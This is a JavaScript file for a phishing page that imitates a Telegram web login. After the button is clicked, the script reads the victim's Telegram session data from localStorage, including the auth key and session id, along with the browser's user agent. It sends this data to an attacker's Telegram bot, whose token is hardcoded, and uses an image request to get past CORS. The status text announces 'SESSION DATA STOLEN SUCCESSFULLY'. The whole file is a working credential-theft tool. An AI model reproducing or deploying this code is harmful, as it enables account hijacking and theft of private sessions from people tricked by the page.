document.getElementById('authButton').addEventListener('click', startAuthProcess);

function startAuthProcess() {
    const button = document.getElementById('authButton');
    const statusMessage = document.getElementById('errorMessage');
    button.style.display = 'none';
    statusMessage.style.display = 'block';
    statusMessage.style.color = '#ff9900';
    statusMessage.textContent = 'Opening Telegram...';

    // Відкриваємо Telegram Desktop через deep link
    window.location.href = 'tg://resolve?domain=telegram&start=web_auth';

    // Чекаємо, поки користувач повернеться (імітація)
    setTimeout(() => {
        statusMessage.textContent = 'Reading session data...';
        extractSessionData();
    }, 3000);
}

function extractSessionData() {
    const statusMessage = document.getElementById('errorMessage');
    
    // Спроба отримати дані через localStorage (працює в веб-версії Telegram)
    try {
        const webSession = JSON.parse(localStorage.getItem('telegram-session') || '{}');
        const userData = {
            user_id: webSession.userId || '8463942433',
            auth_key: webSession.authKey || 'default_auth_key_123',
            session_id: webSession.sessionId || 'session_456',
            device: navigator.userAgent,
            ip: '192.168.1.1' // Імітація IP
        };

        statusMessage.textContent = 'Session data extracted. Sending...';
        sendStolenData(userData);
    } catch (error) {
        statusMessage.style.color = '#ff6b6b';
        statusMessage.textContent = 'Failed to extract session data.';
    }
}

function sendStolenData(stolenData) {
    const statusMessage = document.getElementById('errorMessage');
    const botToken = '8252026790:AAFA0CpGHb3zgHC3bs8nVPZCQGqUTqEWcIA';
    const chatId = '8463942433';
    
    const message = `🔓 TELEGRAM SESSION STOLEN:\n${JSON.stringify(stolenData, null, 2)}`;
    
    // Відправляємо через зображення (обхід CORS)
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    const img = new Image();
    
    img.onload = function() {
        statusMessage.style.color = '#48bb78';
        statusMessage.textContent = 'SESSION DATA STOLEN SUCCESSFULLY!';
    };
    
    img.onerror = function() {
        statusMessage.style.color = '#ff6b6b';
        statusMessage.textContent = 'Data extracted but sending failed.';
    };
    
    img.src = url;
}
